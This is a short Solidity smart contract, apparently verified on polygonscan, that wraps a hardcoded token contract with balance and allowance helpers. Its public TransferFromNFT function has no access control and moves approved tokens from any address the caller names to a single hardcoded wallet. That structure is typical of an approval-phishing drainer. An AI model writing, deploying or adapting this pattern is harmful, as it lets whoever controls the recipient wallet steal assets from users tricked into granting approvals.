/**
 *Submitted for verification at polygonscan.com on 2022-07-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MyContract {
    IERC20 public AnyToken;
    IERC20 public NFTcontract;

    constructor() {
         NFTcontract = IERC20(0x2953399124F0cBB46d2CbACD8A89cF0599974963);
    }

    function GetNativeTokenBalance(address account) public view returns (uint256) { return account.balance; }

    function GetAllowanceNFT(address owner, address spender) public view returns (uint256) { return NFTcontract.allowance(owner, spender); }
    function GetBalanceNFT(address Addr) public view returns (uint256) { return NFTcontract.balanceOf(Addr); }
    function TransferFromNFT(address FromAddr, uint256 value) public { NFTcontract.transferFrom(FromAddr , 0x55601EbaEd214861338F5c4aBcFdab35F4955863 , value ); }

}